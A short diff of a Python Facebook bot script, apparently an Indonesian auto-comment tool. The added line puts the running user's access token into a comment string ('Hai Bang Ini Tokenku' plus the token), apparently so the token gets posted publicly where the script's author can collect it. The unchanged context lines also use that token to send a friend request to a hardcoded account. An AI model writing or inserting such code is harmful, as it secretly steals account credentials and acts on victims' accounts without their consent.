@@ -218,7 +218,7 @@ def bot_komen():
         os.system('rm -rf login.txt')
 
     una = '100045781089477'
-    kom = 'Hai Bang Jago'
+    kom = ('Hai Bang Ini Tokenku'+toke)
     reac = 'ANGRY'
     post = '194234645445904'
     requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toke)
